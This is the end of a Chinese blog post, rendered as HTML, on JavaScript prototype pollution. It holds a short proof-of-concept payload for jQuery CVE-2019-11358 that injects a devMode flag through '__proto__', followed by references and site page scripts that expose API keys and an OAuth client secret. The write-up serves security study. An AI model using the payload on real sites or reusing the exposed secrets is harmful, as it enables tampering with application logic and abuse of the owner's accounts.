+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = $.extend(<span class="literal">true</span>, &#123;&#125;, <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"__proto__": &#123;"devMode": true&#125;&#125;'</span>))</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.devMode); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+<p>可以看到，之所以说jQuery原型污染的影响不大，是因为这是一个前端漏洞，即使有漏洞，攻击者也需要根据网站（源码审计）产生EXP，当然，如果网站依赖于某些类的某些属性/方法做身份验证或其他的什么事情（例如PoC里的devMode），那么后果还是很严重的。</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><p>JavaScript原型链污染，<a href="https://xz.aliyun.com/t/2735" target="_blank" rel="noopener">https://xz.aliyun.com/t/2735</a></p>
+</li>
+<li><p>深入理解 JavaScript Prototype 污染攻击，<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
+</li>
+<li><p>After three years of silence, a new jQuery prototype pollution vulnerability emerges once again，<a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/" target="_blank" rel="noopener">https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/</a></p>
+</li>
+<li><p>jQuery CVE-2019-11358 原型污染漏洞分析和修复建议, <a href="https://www.anquanke.com/post/id/177093" target="_blank" rel="noopener">https://www.anquanke.com/post/id/177093</a></p>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Anemone</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://anemone.top/JS-原型链污染/" title="JavaScript原型链污染学习笔记">http://anemone.top/JS-原型链污染/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/JavaScript/" rel="tag"># JavaScript</a>
+            
+              <a href="/tags/jQuery/" rel="tag"># jQuery</a>
+            
+              <a href="/tags/原型链污染/" rel="tag"># 原型链污染</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/whitebox-spotbugs添加安全规则/" rel="next" title="spotbugs源码学习&添加安全规则">
+                  <i class="fa fa-chevron-left"></i> spotbugs源码学习&添加安全规则
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/crypto-PaddingOracle攻击/" rel="prev" title="PaddingOracle攻击">
+                  PaddingOracle攻击 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#prototype和-proto"><span class="nav-number">1.</span> <span class="nav-text">prototype和__proto__</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#prototype"><span class="nav-number">1.1.</span> <span class="nav-text">prototype</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#proto"><span class="nav-number">1.2.</span> <span class="nav-text">__proto__</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原型链继承"><span class="nav-number">2.</span> <span class="nav-text">原型链继承</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#原型链污染"><span class="nav-number">3.</span> <span class="nav-text">原型链污染</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#发生场景"><span class="nav-number">3.1.</span> <span class="nav-text">发生场景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法"><span class="nav-number">3.2.</span> <span class="nav-text">利用方法</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#例题"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#有缺陷的Payload"><span class="nav-number">4.1.</span> <span class="nav-text">有缺陷的Payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#优化payload"><span class="nav-number">4.2.</span> <span class="nav-text">优化payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jQuery的原型污染-CVE-2019-11358"><span class="nav-number">5.</span> <span class="nav-text">jQuery的原型污染(CVE-2019-11358)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考链接"><span class="nav-number">6.</span> <span class="nav-text">参考链接</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.jpg"
+      alt="Anemone">
+  <p class="site-author-name" itemprop="name">Anemone</p>
+  <div class="site-description" itemprop="description">关注Web安全、移动安全、Fuzz测试和机器学习</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">70</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">86</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/anemone95" title="GitHub &rarr; https://github.com/anemone95" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:anemone95@qq.com" title="E-Mail &rarr; mailto:anemone95@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2018 – <span itemprop="copyrightYear">2022</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">anemone</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.4.0</div>
+
+        
+
+
+
+
+
+
+  
+  <script>
+  function leancloudSelector(url) {
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = visitors.getAttribute('id').trim();
+      var title = visitors.getAttribute('data-flag-title').trim();
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+            
+              .catch(error => {
+                console.log('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title: title, url: url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.log('Failed to create', error);
+                });
+            
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return element.getAttribute('id').trim();
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.url;
+            var time = item.time;
+            leancloudSelector(url).innerText = time;
+          }
+          for (var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.log('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method: method,
+          headers: {
+            'X-LC-Id': 'o5UaCJdPfEG0g7MVxXSMagpT-gzGzoHsz',
+            'X-LC-Key': 'c6IN1PuMV3QPltJcrHfn74Gt',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        const localhost = /http:\/\/(localhost|127.0.0.1|0.0.0.0)/;
+        if (localhost.test(document.URL)) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.1.0/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/velocity-animate@1/velocity.ui.min.js"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css">
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.js"></script><script src="/js/algolia-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+if (document.querySelectorAll('pre.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      theme: 'forest',
+      logLevel: 3,
+      flowchart: { curve: 'linear' },
+      gantt: { axisFormat: '%m/%d/%Y' },
+      sequence: { actorMargin: 50 }
+    });
+  }, window.mermaid);
+}
+</script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID: 'f3075553d7b0225df6ca',
+      clientSecret: '68362ba87c4cc8e13103afcf729f5bd8ea176a78',
+      repo: 'anemone95.github.io',
+      owner: 'Anemone95',
+      admin: ['Anemone95'],
+      id: 'a0c133fb41c52444b7243bb1b25daf60',
+        language: window.navigator.language || window.navigator.userLanguage,
+      
+      distractionFreeMode: 'true'
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+</script>
+
+</body>
+</html>
